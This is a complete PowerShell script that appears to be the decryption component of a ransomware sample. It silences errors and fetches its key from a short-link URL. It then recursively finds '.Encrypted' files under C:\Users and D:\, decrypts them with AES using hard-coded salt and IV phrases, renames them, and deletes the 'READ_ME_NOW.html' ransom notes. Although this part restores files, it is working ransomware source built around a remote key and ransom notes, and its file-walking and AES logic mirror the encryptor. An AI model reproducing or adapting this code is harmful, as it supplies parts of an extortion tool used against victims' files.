$ErrorActionPreference = "SilentlyContinue"
$web = New-Object Net.WebClient
$key = $web.DownloadString("https://goo.gl/drDgnJ")

function Decrypt-File($Encrypted, $Passphrase)
{
    $salt="I only need to press one key to run the exploit.";
    $init="Or, I can press another and disable the entire plan.";
    $r = new-Object System.Security.Cryptography.RijndaelManaged
    $pass = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)
    $salt = [System.Text.Encoding]::UTF8.GetBytes($salt)

    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
    $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]

    $d = $r.CreateDecryptor()
    $ms = new-Object IO.MemoryStream @(,$Encrypted)
    $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read"
    $sr = new-Object IO.StreamReader $cs
    Write-Output $sr.ReadToEnd()
    $sr.Close()
    $cs.Close()
    $ms.Close()
    $r.Clear()
}

gci C:\Users -Recurse -Include "*.Encrypted" | %{

    try{
        $file = Get-Content $_;
        $Encrypt = Decrypt-File $file $key
        Set-Content -Path $_ -Value $Encrypt

        $newname=$_.name -replace '.Encrypted', '';
        ren -Path $_.FullName -NewName $newname -Force;
        
        $path=$_.DirectoryName+'\READ_ME_NOW.html';
        
        Remove-Item $path;
    }
    catch{}
}

gci D:\ -Recurse -Include "*.Encrypted" | %{

    try{
        $file = Get-Content $_;
        $Encrypt = Decrypt-File $file $key
        Set-Content -Path $_ -Value $Encrypt

        $newname=$_.name -replace '.Encrypted', '';
        ren -Path $_.FullName -NewName $newname -Force;
        
        $path=$_.DirectoryName+'\READ_ME_NOW.html';
        
        Remove-Item $path;
    }
    catch{}
}
